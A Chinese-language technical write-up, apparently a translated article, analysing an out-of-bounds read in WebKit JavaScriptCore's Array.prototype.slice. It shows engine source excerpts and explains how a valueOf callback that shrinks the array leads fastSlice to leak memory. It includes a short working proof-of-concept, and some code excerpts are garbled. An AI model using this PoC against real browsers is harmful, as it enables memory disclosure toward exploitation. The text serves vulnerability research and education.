在[Array.prototype.slice [9]](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/slice)的实现中会出现一个Bug。JavaScript中调用slice方法时，将调用位于ArrayPrototype.cpp中的本地函数arrayProtoFuncSlice：
        var a = [1, 2, 3, 4];
        var s = a.slice(1, 3);
        // s now contains [2, 3]
为了可读性，将[ArrayPrototype.cpp](https://github.com/WebKit/webkit/blob/320b1fc3f6f47a31b6ccb4578bcea56c32c9e10b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L848)的代码格式化之后精简了一下，并标出了注释语句，这段代码在网上也是有迹可循的[[10]](https://github.com/WebKit/webkit/blob/320b1fc3f6f47a31b6ccb4578bcea56c32c9e10b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L848)。
    EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
    {
        /* [[ 1 ]] */
        JSObject* thisObj = exec->thisValue()
        .toThis(exec, StrictMode)
        .toObject(exec);
        if (!thisObj)
            return JSValue::encode(JSValue());
        /* [[ 2 ]] */
        unsigned length = getLength(exec, thisObj);
        if (exec->hadException())
            return JSValue::encode(jsUndefined());
        /* [[ 3 ]] */
        unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);
        unsigned end =
        argumentClampedIndexFromStartOrEnd(exec, 1, length, length);
        /* [[ 4 ]] */
        std::pair speciesResult =
        speciesConstructArray(exec, thisObj, end - begin);
        // We can only get an exception if we call some user function.
        if (UNLIKELY(speciesResult.first ==
                     SpeciesConstructResult::Exception))
            return JSValue::encode(jsUndefined());
        /* [[ 5 ]] */
        if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &&
                   isJSArray(thisObj))) {
            if (JSArray* result =
                asArray(thisObj)->fastSlice(*exec, begin, end - begin))
                return JSValue::encode(result);
        }
        JSObject* result;
        if (speciesResult.first == SpeciesConstructResult::CreatedObject)
            result = speciesResult.second;
        else
            result = constructEmptyArray(exec, nullptr, end - begin);
        unsigned n = 0;
        for (unsigned k = begin; k hadException())
                return JSValue::encode(jsUndefined());
            if (v)
                result->putDirectIndex(exec, n, v);
        }
        setLength(exec, result, n);
        return JSValue::encode(result);
    }
代码本质上执行以下操作：
  1. 获取方法调用的对象（数组对象）
  2. 检索数组的长度
  3. 将参数（开始和结束的索引参数）转换为本地整数类型，并将它们限制了[0，length）的长度范围
  4. 检查是否使用了构造函数[[11]](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/species)
  5. 执行切片
>
> 最后一步的实现可以用这两种方式完成：如果数组是具有密集存储的本地数组，则将使用“fastSlice”，使用给定的索引和长度将内存值写入新数组。如果快速路径不可能，则使用简单循环来获取每个元素并将其添加到新数组。
> 注意，与在慢速路径上使用的属性访问器相反，fastSlice不执行任何附加边界检查
看看代码，很容易假定`begin`和`end`之间的长度变量在被转换为本地整数之后小于数组的长度。
然而，我们可以通过JavaScript类型转换规则推翻这个假设。
#### 2.2 关于Javascript类型转换
JavaScript本质上是弱类型的语言，这就意味着它善于将不同类型的值转换为当前所需要类型的值。 例如Math.abs（），它能返回参数的绝对值。
(以下是“有效”调用，不会引发异常)：
    Math.abs(-42);      // argument is a number
    // 42
    Math.abs("-42");    // argument is a string
    // 42
    Math.abs([]);       // argument is an empty array
    // 0
    Math.abs(true);     // argument is a boolean
    // 1
    Math.abs({});       // argument is an object
    // NaN
相比之下，强类型的语言(如Python)在将字符串传递给abs()函数时，反而更容易抛出异常(在静态语言下，会发生编译错误)
数字类型的转换规则在参考文献[[12]](http://www.ecma-international.org/ecma-262/6.0/#sec-type-conversion)中有描述。掌握对象类型转换成数字（或常见原始类型）的转换规则是特别有趣的。
特别是，如果对象有一个名为“valueOf”的可调用属性，它是一个原始值，这个程序则将被调用，并返回一个值。如：
    Math.abs({valueOf: function() { return -42; }});
    // 42
#### 2.3 valueOf的利用
在使用arrayProtoFuncSlice方法的情况下，slice的复制操作是为了原始类型在argumentClampedIndexFromStartOrEnd中执行。“valueOf"也可以用于限制参数的范围为[0,length]：
    JSValue value = exec->argument(argument);
    if (value.isUndefined())
    return undefinedValue;
    double indexDouble = value.toInteger(exec);  // Conversion happens here
    if (indexDouble (indexDouble);
        }
        return indexDouble > length ? length :
        static_cast(indexDouble);
            return indexDouble (indexDouble);
        }
        return indexDouble > length ? length :static_cast(indexDouble);
现在，如果我们修改valueOf()函数内其中一个参数的数组长度，那么slice方法的执行将继续使用前面的长度，导致在memcpy期间越界访问。
在这之前，如果缩减数组，我们必须调整元素存储实际大小。从JSArray::setLength，我们可以很快看出.length转换器的实现过程：
    unsigned lengthToClear = butterfly->publicLength() - newLength;
    unsigned costToAllocateNewButterfly = 64; // a heuristic.
    if (lengthToClear > newLength &&
        lengthToClear > costToAllocateNewButterfly) {
        reallocateAndShrinkButterfly(exec->vm(), newLength);
        return true;
    }
这段代码展示了一个简单的启发式程序——避免太频繁地重定位数组。 为了强制重定位数组，需要新的数组大小远小于旧的大小，把有100元素的数组调整到0会成功。
有了这些，我们就可以利用Array.prototype.slice：
    var a = [];
    for (var i = 0; i < 100; i++)
    a.push(i + 0.123);
    var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});
    // b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]
正确的输出是大小为10的数组填充了“未定义”值，因为数组在切片操作之前已被清除。
但是，我们可以在数组中看到一些浮点值，似乎已经可以看出一些数据存储在数组之外。
#### 2.4 反思Bug
这个特别的编程错误不是新的，并且已经被利用了一段时间[[[13]](https://bugzilla.mozilla.org/show_bug.cgi?id=735104),[[14]](https://bugzilla.mozilla.org/show_bug.cgi?id=983344),[[15]](https://bugs.chromium.org/p/chromium/issues/detail?id=554946)。
这里的核心问题是处于可变的状态，在堆栈帧（即数组对象的长度）中的“缓存”结合各种回调机制，可以执行用户提供的代码进一步向下调用堆栈
(用”valueOf“方法）。通过这个设置，很容易在整个函数中做出关于引擎状态的假设。由于各种事件回调，DOM中也出现了同样的错误问题。
### 3 JavascriptCore堆
在时候，我们已经通过数组读取数据，但是并不知道这个过程中我们正在访问的是什么。要明白这个过程，我们需要了解一些关于JSC堆分配器的一些背景知识。